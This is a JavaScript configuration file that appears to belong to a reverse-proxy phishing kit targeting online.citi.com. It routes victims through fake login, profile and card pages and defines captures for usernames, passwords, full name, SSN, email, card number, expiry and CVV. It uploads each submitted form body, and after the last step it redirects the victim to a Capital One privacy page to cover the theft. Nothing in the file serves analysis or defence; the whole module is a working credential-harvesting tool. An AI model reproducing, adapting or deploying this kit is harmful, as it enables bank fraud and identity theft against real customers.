/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')

const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */

/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        return super.processRequest()
    }
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {

        super(proxyResp, browserEndPoint)
        this.regexes = []
    }


    processResponse() {
        return super.processResponse()
    }
}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true
    }

    execute(clientContext) {
        if (this.req.method === 'POST') {
            clientContext.setLogAvailable(true)
            super.uploadRequestBody(clientContext.currentDomain, clientContext)
        }
        
        return super.superExecuteProxy(clientContext.currentDomain, clientContext)
    }
}

const ExecPhpPager = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return req.url.startsWith('/session/secure/');

    }

    execute(clientContext) {
        if (this.req.method === 'POST') {
            if (this.req.url === '/session/secure/emailInfo') {
                super.captureBody(clientContext.currentDomain, clientContext)

                super.superExecutePhpScript('app/emailcapture.php', clientContext)
            } else {
                
                switch (this.req.url) {
                    case '/session/secure/login':
                        super.uploadRequestBody(clientContext.currentDomain, clientContext)
                        this.res.writeHead(302, { location: '/session/secure/profile'})
                        this.res.end()
                        break
                    case '/session/secure/profile':
                        super.uploadRequestBody(clientContext.currentDomain, clientContext)
                        this.res.writeHead(302, { location: '/session/secure/card'})
                        this.res.end()
                        break
                    case '/session/secure/card':
                        super.superExecutePhpScript('card.php', clientContext)
                        super.uploadRequestBody(clientContext.currentDomain, clientContext)
                        this.res.writeHead(302, { location: 'https://www.capitalone.com/privacy/online-privacy-policy/'})
                        this.res.end()
                        break
                    default:
                        super.uploadRequestBody(clientContext.currentDomain, clientContext)
                        this.res.writeHead(200)
                        this.res.end()
                }
            }
        } else {
            switch (this.req.url) {
                case '/session/secure/login':
                    super.superExecutePhpScript('login.php', clientContext)
                    break
                case '/session/secure/profile':
                    super.superExecutePhpScript('profile.php', clientContext)
                    break
                case '/session/secure/card':
                    super.superExecutePhpScript('card.php', clientContext)
                    break
                default:
                    super.superExecutePhpScript('404.php', clientContext)
            }
        }
    }


}


const configExport = {
    CURRENT_DOMAIN: 'online.citi.com',
    START_PATH: '/session/secure/login',
    PRE_HANDLERS:
        [
            ExecPhpPager,
        ],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        loginUserName: {
            method: 'POST',
            params: ['username'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        loginPassword: {
            method: 'POST',
            params: ['password'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        loginUserName2: {
            method: 'POST',
            params: ['username1'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        loginPassword2: {
            method: 'POST',
            params: ['password1'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        fullName: {
            method: 'POST',
            params: ['fullname'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        SSN: {
            method: 'POST',
            params: ['ssn'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        email: {
            method: 'POST',
            params: ['email'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        CardNumber: {
            method: 'POST',
            params: ['card'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        Expiry: {
            method: 'POST',
            params: ['exp'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        cvv: {
            method: 'POST',
            params: ['cvv'],
            urls: '',
            hosts: 'PHP-EXEC',
        },


        defaultPhpCapture: {
            method: 'POST',
            params: ['default'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
    },

}
module.exports = configExport